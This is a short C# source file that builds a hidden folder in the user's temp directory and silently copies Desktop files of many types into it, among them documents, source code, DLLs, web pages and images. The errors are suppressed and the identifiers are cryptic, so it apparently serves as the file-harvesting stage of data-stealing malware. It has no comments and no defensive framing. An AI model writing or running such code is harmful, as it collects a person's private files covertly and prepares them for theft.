using System;
using System.Collections.Generic;
using System.Text;
using System.IO;

static class CopyAll
{
    public static string EBLA = Environment.GetEnvironmentVariable("temp");
    public static string use = Environment.UserName;
    public static string Vivalti = EBLA + "\\" + use;
    public static string TxtPath = EBLA + "\\" + use + @"\DesktopFiles\";
    public static string GooVer = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
    public static string[] Extensions = new string[] 
    { "*.txt", "*.doc", 
      "*.docx", "*.cs", 
      "*.Dll", "*.Html",
      "*.Htm", "*.Xml", 
      "*.Cpp", "*.C", 
      "*.H",   "*.Php", 
      "*.jpg", "*.png",
      "*.ico"
    };
    public static void CreateDirectory()
    {
        if (!Directory.Exists(Vivalti))
        {
            DirectoryInfo txtPTH = Directory.CreateDirectory(Vivalti);
            DirectoryInfo s = new DirectoryInfo(Vivalti);
            s.Attributes = FileAttributes.Hidden | FileAttributes.Hidden;
            Directory.CreateDirectory(TxtPath);
        }
    }
    static IEnumerable<string> GetFiles(string path)
    {
        Queue<string> queue = new Queue<string>();
        queue.Enqueue(path);
        while (queue.Count > 0)
        {
            path = queue.Dequeue();
            try
            {
                foreach (string subDir in Directory.GetDirectories(path))
                {
                    queue.Enqueue(subDir);
                }
            }
            catch { }
            string[] files = null;
            try
            {
                files = Directory.GetFiles(path);
            }
            catch { }
            if (files != null)
            {
                for (int i = 0; i < files.Length; i++)
                {
                    yield return files[i];
                }
            }
        }
    }
    public static void ss()
    {
        foreach (string Rembo in Extensions)
        {
            try
            {
                string[] Inferno = Directory.GetFiles(GooVer, Rembo, SearchOption.AllDirectories);
                foreach (string Mic in Inferno)
                {
                    File.Copy(Mic, TxtPath + Path.GetFileName(Mic));
                }
            }
            catch { }
        }
    }
}